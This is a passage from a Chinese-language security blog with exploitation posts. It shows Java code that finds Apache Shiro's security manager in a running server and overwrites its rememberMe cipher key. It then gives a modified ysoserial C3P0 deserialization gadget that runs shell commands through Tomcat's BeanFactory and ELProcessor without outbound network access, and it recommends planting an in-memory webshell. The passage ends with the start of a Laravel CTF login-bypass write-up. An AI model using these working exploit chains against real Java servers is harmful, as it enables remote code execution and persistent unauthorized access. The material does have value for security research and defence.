CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) defaultSecurityManager.getRememberMeManager();</span><br><span class="line">    cookieRememberMeManager.setCipherKey(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(<span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/11/17/16371526106736.jpg"></p>
<p>为了更通用一点能在大部分中间件下使用，可以参考以前的DFS回显改一版修改密钥的出来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.CookieRememberMeManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DFS_edit_shiro_key</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> HashSet&lt;Object&gt; h;</span><br><span class="line">    <span class="keyword">static</span> DefaultWebSecurityManager r;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DFS_edit_shiro_key</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        r = <span class="keyword">null</span>;</span><br><span class="line">        h =<span class="keyword">new</span> HashSet&lt;Object&gt;();</span><br><span class="line">        F(Thread.currentThread(),<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">i</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(obj==<span class="keyword">null</span>|| h.contains(obj))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h.add(obj);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">p</span><span class="params">(Object o, <span class="keyword">int</span> depth)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth &gt; <span class="number">52</span>||(r !=<span class="keyword">null</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!i(o))&#123;</span><br><span class="line">            <span class="keyword">if</span>(r ==<span class="keyword">null</span>&amp;&amp; DefaultWebSecurityManager.class.isAssignableFrom(o.getClass()))&#123;</span><br><span class="line">                r = (DefaultWebSecurityManager)o;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(r != <span class="keyword">null</span>)&#123;</span><br><span class="line">                CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) r.getRememberMeManager();</span><br><span class="line">                cookieRememberMeManager.setCipherKey(<span class="keyword">new</span> BASE64Decoder().decodeBuffer(<span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            F(o,depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">F</span><span class="params">(Object start, <span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Class n=start.getClass();</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (Field declaredField : n.getDeclaredFields()) &#123;</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object o = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    o = declaredField.get(start);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!o.getClass().isArray())&#123;</span><br><span class="line">                        p(o,depth);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">for</span> (Object q : (Object[]) o) &#123;</span><br><span class="line">                            p(q, depth);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">while</span>(</span><br><span class="line">            (n = n.getSuperclass())!=<span class="keyword">null</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>因为cipherkey用来加密序列化后的登录信息，修改了key后应该会导致之前业务上使用rememberMe自动登录的账户需要重新登录(感觉影响不大)。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8">https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2021/10/10/JAVA反序列化之C3P0不出网利用/"><span>JAVA反序列化之C3P0不出网利用</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/10/10/JAVA反序列化之C3P0不出网利用/" rel="bookmark">
        <time class="entry-date published" datetime="2021-10-10T02:35:54.000Z">
          2021-10-10
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>C3P0是本人在实战环境中除CommonsCollections、CommonsBeanutiles以外遇到最多的JAR包，其中一部分C3P0是被org.quartz-scheduler:quartz所依赖进来的。<br>ysoserial中也提供了C3P0 Gadget, 利用方式为URLClassLoader加载远程class实例化实现代码执行, 因此带来了一个限制，需要目标能够出网。<br>近期在做一次测试的时候，发现了个反序列化漏洞环境为Tomcat8，尝试了常用的Gadget都不存在，使用C3P0时产生了DNS请求不过无HTTP请求，换了一些常见端口一样无HTTP请求导致无法利用，折腾了半天最后还是只能回去看看C3P0的代码。</p>
<h2 id="C3P0-分析"><a href="#C3P0-分析" class="headerlink" title="C3P0 分析"></a>C3P0 分析</h2><p>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">short</span> version = ois.readShort();</span><br><span class="line">    <span class="keyword">switch</span>(version) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Object o = ois.readObject();</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) &#123;</span><br><span class="line">            o = ((IndirectlySerialized)o).getObject();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>com.mchange.v2.naming.ReferenceIndirector</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.env == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    var1 = <span class="keyword">new</span> InitialContext(<span class="keyword">this</span>.env);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Context var2 = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.contextName != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var2 = (Context)var1.lookup(<span class="keyword">this</span>.contextName);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 利用点</span></span><br><span class="line">                <span class="keyword">return</span> ReferenceableUtils.referenceToObject(<span class="keyword">this</span>.reference, <span class="keyword">this</span>.name, var2, <span class="keyword">this</span>.env);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) &#123;</span><br><span class="line">                    ReferenceIndirector.logger.log(MLevel.WARNING, <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object.&quot;</span>, var3);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Failed to acquire the Context necessary to lookup an Object: &quot;</span> + var3.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在getObject方法中，很明显可以JNDI注入，但是JNDI注入的限制条件比URLClassLoader加载远程class限制条件还多，不考虑。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">referenceToObject</span><span class="params">(Reference var0, Name var1, Context var2, Hashtable var3)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String var4 = var0.getFactoryClassName();</span><br><span class="line">        String var11 = var0.getFactoryClassLocation();</span><br><span class="line">        ClassLoader var6 = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var6 = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object var7;</span><br><span class="line">        <span class="keyword">if</span> (var11 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var7 = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            URL var8 = <span class="keyword">new</span> URL(var11);</span><br><span class="line">            var7 = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;var8&#125;, var6);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class var12 = Class.forName(var4, <span class="keyword">true</span>, (ClassLoader)var7);</span><br><span class="line">        ObjectFactory var9 = (ObjectFactory)var12.newInstance();</span><br><span class="line">        <span class="keyword">return</span> var9.getObjectInstance(var0, var1, var2, var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isLoggable(MLevel.FINE)) &#123;</span><br><span class="line">            logger.log(MLevel.FINE, <span class="string">&quot;Could not resolve Reference to Object!&quot;</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        NamingException var5 = <span class="keyword">new</span> NamingException(<span class="string">&quot;Could not resolve Reference to Object!&quot;</span>);</span><br><span class="line">        var5.setRootCause(var10);</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial中的利用就是通过referenceToObject方法URLClassloader加载远程class实现利用。<br>可以发现在referenceToObject方法中如果getFactoryClassLocation获取到的是null，就不会使用URLClassloader而是当前线程的ClassLoader，这意味着能够实例化WEB目录下的任意类。<br>​能够实例化任意类也很难找到利用点，不过在referenceToObject中可以发现它在实例化完指定类后，还会调用它的getObjectInstance方法，看到这个方法名立马就能想到以前JNDI注入 绕过trustCodebaseURL限制的方法(这里不再赘述，可参考 <a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a> )，通过Tomcat的getObjectInstance方法调用ELProcessor的eval方法实现表达式注入，刚好目标环境是Tomcat8按理是可以实现无网利用的。<br>​<br>​修改一下ysoserial中的原生C3P0</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">yulegeyu modified</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( harness=<span class="string">&quot;ysoserial.test.payloads.RemoteClassLoadingTest&quot;</span> )</span><br><span class="line"><span class="meta">@Dependencies( &#123; &quot;com.mchange:c3p0:0.9.5.2&quot; ,&quot;com.mchange:mchange-commons-java:0.2.11&quot;&#125; )</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C3P0Tomcat</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">        Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">&quot;connectionPoolDataSource&quot;</span>).set(b, <span class="keyword">new</span> PoolSource(<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="keyword">null</span>));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.className = className;</span><br><span class="line">            <span class="keyword">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">            String cmd = <span class="string">&quot;open -a calculator.app&quot;</span>;</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;&quot;</span>+ cmd +<span class="string">&quot;&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> ref;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(C3P0.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/10/09/16337627136271.jpg"></p>
<p>不出网时最好还是直接中一个内存马~</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/10/09/16337627538823.jpg"></p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/10/09/16337627902983.jpg"></p>
<p>最后，市面上存在两个C3P0，com.mchange:c3p0、c3p0:c3p0。比较常见的是第一个，两个C3P0都能够利用但是因为SUID的原因需要稍微变化一下，黑盒反序列打第一个没反应时可以尝试下第二个，可能有惊喜~</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2021/09/22/那些年一起打过的CTF-Laravel-任意用户登陆Tricks分析/"><span>那些年一起打过的CTF - Laravel 任意用户登陆Tricks分析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/09/22/那些年一起打过的CTF-Laravel-任意用户登陆Tricks分析/" rel="bookmark">
        <time class="entry-date published" datetime="2021-09-22T15:11:35.000Z">
          2021-09-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>这里通过一道之前的CTF题目分享laravel的一个小tricks，题目是我一年多前出在npointer的。题目比较简单，一共两个考点，一个是laravel登录功能的小tricks，另一个为fastjson的利用。<br>当时题目中使用的是express，不过其实算是弱类型语言框架一个比较通用的问题，换成了使用更多的laravel为例。</p>
<h2 id="1、Laravel-登录-tricks"><a href="#1、Laravel-登录-tricks" class="headerlink" title="1、Laravel 登录 tricks"></a>1、Laravel 登录 tricks</h2><p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321877334020.jpg" alt="-w883"></p>
<p>打开题目后，就是一个登陆页面。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pwdRegex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;(?=.*[0-9])(?=.*[A-Z])(?=.*[a-z])(?=.*[^a-zA-Z0</span></span><br><span class="line"><span class="string">  -9]).&#123;12,30&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pwdRegex.test(data.password.value)) &#123; $(<span class="string">&quot;#msg&quot;</span>).text(<span class="string">&quot;填写的密码格式不正确，密码中必须包含大小写字母、数字、特殊字符，密码最少12位数!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在前端有密码复杂度校验，这个校验主要是为了提示该系统账户不是弱口令不用去爆破，同时经过探测可以发现不存在SQL注入。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16321900154473.jpg" alt="-w1787"><br>首先抓个包，通过cookie可以发现后端使用的框架为laravel，并且只有前端校验密码复杂度，后端没有校验密码随意输入也可以登录，判断了账号和密码是否为空。</p>
<p>现在很多系统在接收参数时支持解析多种content-type，框架会根据content-type去解析post包。</p>
